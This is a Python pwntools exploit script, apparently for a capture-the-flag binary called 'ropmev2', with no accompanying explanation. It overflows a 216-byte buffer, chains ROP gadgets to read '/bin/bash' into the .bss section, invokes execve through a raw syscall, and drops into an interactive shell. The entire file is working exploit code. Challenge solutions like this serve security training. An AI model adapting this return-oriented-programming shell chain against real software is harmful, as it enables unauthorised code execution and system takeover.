from pwn import *
#context.log_level='DEBUG'

p = process("./ropmev2")
elf = ELF("./ropmev2", checksec=False)
libc = elf.libc

def start():
	if not args.REMOTE:
		return process("./ropmev2")
	else:
		return remote("localhost", 22)

p = start()

def main():

	log.info(hex(elf.bss()))

	bss = 0x403800
	syscall = 0x0000000000401168 # syscall
	pop_rdi = 0x000000000040142b # pop rdi; ret
	pop_rax = 0x0000000000401162 # pop rax; ret
	pop_rsi_r15 = 0x0000000000401429 # pop rsi ; pop r15 ; ret
	pop_rdx_r13 = 0x0000000000401164 # pop rdx ; pop r13 ; ret
	read = 0x401050 # read@plt

	# read(0, bss, 10)
	payload = ""
	payload += "A"*216
	payload += p64(pop_rdi)
	payload += p64(0)
	payload += p64(pop_rsi_r15)
	payload += p64(bss)
	payload += p64(0)
	payload += p64(pop_rdx_r13)
	payload += p64(10)
	payload += p64(0)
	payload += p64(read)

	# execve(bss, NULL, NULL)
	payload += p64(pop_rax)
	payload += p64(59)
	payload += p64(pop_rdi)
	payload += p64(bss)
	payload += p64(pop_rsi_r15)
	payload += p64(0)
	payload += p64(0)
	payload += p64(pop_rdx_r13)
	payload += p64(0)
	payload += p64(0)
	payload += p64(syscall)

	p.recvuntil("me\n")

	p.send(payload)

	sleep(1)

	p.send("/bin/bash\x00")
	p.interactive()

if __name__=="__main__":
	main()
